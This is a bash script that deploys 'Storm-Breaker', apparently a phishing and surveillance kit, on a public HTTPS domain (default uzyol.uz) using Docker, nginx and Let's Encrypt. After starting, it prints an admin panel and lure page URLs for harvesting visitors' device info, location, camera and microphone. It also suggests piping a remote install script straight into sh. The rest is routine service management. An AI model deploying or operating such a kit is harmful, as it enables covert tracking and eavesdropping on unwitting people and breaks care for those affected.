#!/bin/bash

# Storm-Breaker Quick Deployment Script
# Usage: ./deploy.sh [start|stop|restart|logs|status|ssl]

set -e

DOMAIN="${DOMAIN:-uzyol.uz}"
SSL_EMAIL="${SSL_EMAIL:-admin@uzyol.uz}"

# Colors for output
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
NC='\033[0m' # No Color

# Functions
print_header() {
    echo -e "${GREEN}================================${NC}"
    echo -e "${GREEN}  Storm-Breaker Deployment${NC}"
    echo -e "${GREEN}================================${NC}"
}

print_success() {
    echo -e "${GREEN}[✓]${NC} $1"
}

print_error() {
    echo -e "${RED}[✗]${NC} $1"
}

print_warning() {
    echo -e "${YELLOW}[!]${NC} $1"
}

check_requirements() {
    print_header
    echo "Checking requirements..."

    # Check if Docker is installed
    if ! command -v docker &> /dev/null; then
        print_error "Docker is not installed. Please install Docker first."
        echo "Run: curl -fsSL https://get.docker.com | sh"
        exit 1
    fi
    print_success "Docker is installed"

    # Check if Docker Compose is installed
    if ! command -v docker-compose &> /dev/null; then
        print_error "Docker Compose is not installed. Please install Docker Compose first."
        exit 1
    fi
    print_success "Docker Compose is installed"

    # Check if SSL certificates exist
    if [ ! -f "nginx/ssl/fullchain.pem" ] || [ ! -f "nginx/ssl/privkey.pem" ]; then
        print_warning "SSL certificates not found!"
        echo "Run: ./deploy.sh ssl"
        echo "Or continue with self-signed certificate (not recommended for production)"
    else
        print_success "SSL certificates found"
    fi
}

start_services() {
    print_header
    echo "Starting Storm-Breaker services..."

    # Create necessary directories
    mkdir -p storm-web/log storm-web/images storm-web/sounds nginx/ssl

    # Build and start
    docker-compose build
    docker-compose up -d

    print_success "Services started successfully"
    echo ""
    echo "Admin Panel: https://${DOMAIN}"
    echo "Username: admin"
    echo "Password: (check storm-web/config.php)"
    echo ""
    echo "Template URLs:"
    echo "  - Device Info: https://${DOMAIN}/templates/normal_data/index.html"
    echo "  - Location: https://${DOMAIN}/templates/nearyou/index.html"
    echo "  - Camera: https://${DOMAIN}/templates/camera_temp/index.html"
    echo "  - Microphone: https://${DOMAIN}/templates/microphone/index.html"
}

stop_services() {
    print_header
    echo "Stopping Storm-Breaker services..."
    docker-compose down
    print_success "Services stopped successfully"
}

restart_services() {
    print_header
    echo "Restarting Storm-Breaker services..."
    docker-compose restart
    print_success "Services restarted successfully"
}

show_logs() {
    print_header
    echo "Showing logs (Ctrl+C to exit)..."
    docker-compose logs -f
}

show_status() {
    print_header
    echo "Service Status:"
    docker-compose ps
    echo ""
    echo "Resource Usage:"
    docker stats --no-stream
}

setup_ssl() {
    print_header
    echo "Setting up SSL certificate..."

    # Check if certbot is installed
    if ! command -v certbot &> /dev/null; then
        print_warning "Certbot not found. Installing..."
        sudo apt update
        sudo apt install -y certbot
    fi

    # Stop nginx if running
    docker-compose stop nginx 2>/dev/null || true

    print_warning "Make sure port 80 is accessible and DNS is configured!"
    read -p "Press Enter to continue or Ctrl+C to cancel..."

    # Obtain certificate
    sudo certbot certonly --standalone \
        --preferred-challenges http \
        --email "${SSL_EMAIL}" \
        --agree-tos \
        --no-eff-email \
        -d "${DOMAIN}" \
        -d "www.${DOMAIN}"

    # Copy certificates
    sudo cp "/etc/letsencrypt/live/${DOMAIN}/fullchain.pem" nginx/ssl/
    sudo cp "/etc/letsencrypt/live/${DOMAIN}/privkey.pem" nginx/ssl/
    sudo chmod 644 nginx/ssl/fullchain.pem
    sudo chmod 600 nginx/ssl/privkey.pem
    sudo chown $USER:$USER nginx/ssl/*.pem

    print_success "SSL certificate installed successfully"
    print_warning "Certificate will expire in 90 days. Set up auto-renewal!"
    echo "Add to crontab: 0 2 * * * /path/to/deploy.sh renew-ssl"
}

renew_ssl() {
    print_header
    echo "Renewing SSL certificate..."

    # Stop services
    docker-compose down

    # Renew
    sudo certbot renew --quiet

    # Copy certificates
    sudo cp "/etc/letsencrypt/live/${DOMAIN}/fullchain.pem" nginx/ssl/
    sudo cp "/etc/letsencrypt/live/${DOMAIN}/privkey.pem" nginx/ssl/
    sudo chown $USER:$USER nginx/ssl/*.pem

    # Restart services
    docker-compose up -d

    print_success "SSL certificate renewed successfully"
}

self_signed_ssl() {
    print_header
    echo "Generating self-signed SSL certificate..."
    print_warning "This is for TESTING ONLY. Use proper SSL for production!"

    mkdir -p nginx/ssl

    openssl req -x509 -nodes -days 365 -newkey rsa:2048 \
        -keyout nginx/ssl/privkey.pem \
        -out nginx/ssl/fullchain.pem \
        -subj "/C=UZ/ST=Tashkent/L=Tashkent/O=Test/CN=${DOMAIN}"

    chmod 644 nginx/ssl/fullchain.pem
    chmod 600 nginx/ssl/privkey.pem

    print_success "Self-signed certificate generated"
    print_warning "Browsers will show security warnings!"
}

show_help() {
    echo "Storm-Breaker Deployment Script"
    echo ""
    echo "Usage: ./deploy.sh [command]"
    echo ""
    echo "Commands:"
    echo "  start         - Start all services"
    echo "  stop          - Stop all services"
    echo "  restart       - Restart all services"
    echo "  logs          - Show service logs"
    echo "  status        - Show service status"
    echo "  ssl           - Setup SSL certificate (Let's Encrypt)"
    echo "  renew-ssl     - Renew SSL certificate"
    echo "  self-ssl      - Generate self-signed SSL (testing only)"
    echo "  check         - Check requirements"
    echo "  help          - Show this help message"
    echo ""
    echo "Environment Variables:"
    echo "  DOMAIN        - Your domain name (default: uzyol.uz)"
    echo "  SSL_EMAIL     - Email for SSL certificate (default: admin@uzyol.uz)"
}

# Main script
case "${1}" in
    start)
        check_requirements
        start_services
        ;;
    stop)
        stop_services
        ;;
    restart)
        restart_services
        ;;
    logs)
        show_logs
        ;;
    status)
        show_status
        ;;
    ssl)
        setup_ssl
        ;;
    renew-ssl)
        renew_ssl
        ;;
    self-ssl)
        self_signed_ssl
        ;;
    check)
        check_requirements
        ;;
    help|--help|-h)
        show_help
        ;;
    *)
        print_error "Unknown command: ${1}"
        echo ""
        show_help
        exit 1
        ;;
esac
